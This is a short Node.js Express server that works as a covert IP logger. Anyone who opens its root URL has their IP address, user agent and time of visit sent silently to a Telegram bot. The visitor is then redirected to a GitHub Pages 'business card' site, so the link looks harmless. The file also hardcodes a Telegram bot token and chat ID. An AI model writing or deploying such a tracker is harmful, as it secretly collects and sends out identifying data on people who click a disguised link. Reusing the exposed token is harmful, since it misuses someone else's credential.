const express = require('express');
const app = express();
const TOKEN = '8619933114:AAFFa4SN6gAMuiJctEXl4RjJBqXV_xmxBHA';
const CHAT = '6120144391';
app.get('/', async (req, res) => {
const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown').split(',')[0].trim();
const ua = req.headers['user-agent'] || 'unknown';
const now = new Date().toLocaleString('ru-RU', {timeZone: 'Europe/Moscow'});
const msg = 'Переход!\nВремя: ' + now + '\nIP: ' + ip + '\nУстройство: ' + ua;
await fetch('https://api.telegram.org/bot' + TOKEN + '/sendMessage', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({chat_id: CHAT, text: msg})});
res.redirect('https://mamkagde-ops.github.io/Vizitka/');
});
app.listen(process.env.PORT || 3000, () => console.log('ok'));
